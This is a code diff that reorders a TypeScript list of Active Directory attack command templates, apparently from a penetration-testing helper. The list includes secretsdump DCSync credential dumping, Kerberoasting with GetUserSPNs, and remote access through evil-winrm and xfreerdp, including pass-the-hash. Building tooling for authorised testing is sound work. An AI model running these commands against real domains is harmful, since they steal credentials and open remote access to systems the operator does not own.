@@ -26,21 +26,21 @@ const domainCommands: Command[] = [
   },
   {
     template:
+      "xfreerdp /u:'{username}' /d:'{domain}' /p:'{password}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
+    authType: "password",
+  },
+  {
+    template: "evil-winrm -u '{username}' -p '{password}' -i '{targetHost}'",
+    authType: "password",
+  },
+  {
+    template:
       "impacket-GetUserSPNs -request -dc-ip '{targetHost}' '{domain}'/'{username}':'{password}' -outputfile hashes.kerberoast",
     authType: "password",
   },
   {
     template:
       "impacket-secretsdump -outputfile 'dcsync.dump' '{domain}'/'{username}':'{password}'@'{targetHost}'",
-    authType: "password",
-  },
-  {
-    template:
-      "xfreerdp /u:'{username}' /d:'{domain}' /p:'{password}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
-    authType: "password",
-  },
-  {
-    template: "evil-winrm -u '{username}' -p '{password}' -i '{targetHost}'",
     authType: "password",
   },
   {
@@ -65,12 +65,7 @@ const domainCommands: Command[] = [
   },
   {
     template:
-      "impacket-GetUserSPNs -request -dc-ip '{targetHost}' '{domain}'/'{username}' -hashes '00:{ntlmHash}' -outputfile hashes.kerberoast",
-    authType: "ntlmHash",
-  },
-  {
-    template:
-      "impacket-secretsdump -outputfile 'dcsync.dump' '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
+      "xfreerdp /u:'{username}' /d:'{domain}' /pth:'{ntlmHash}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
     authType: "ntlmHash",
   },
   {
@@ -79,7 +74,12 @@ const domainCommands: Command[] = [
   },
   {
     template:
-      "xfreerdp /u:'{username}' /d:'{domain}' /pth:'{ntlmHash}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
+      "impacket-GetUserSPNs -request -dc-ip '{targetHost}' '{domain}'/'{username}' -hashes '00:{ntlmHash}' -outputfile hashes.kerberoast",
+    authType: "ntlmHash",
+  },
+  {
+    template:
+      "impacket-secretsdump -outputfile 'dcsync.dump' '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
     authType: "ntlmHash",
   },
 ];
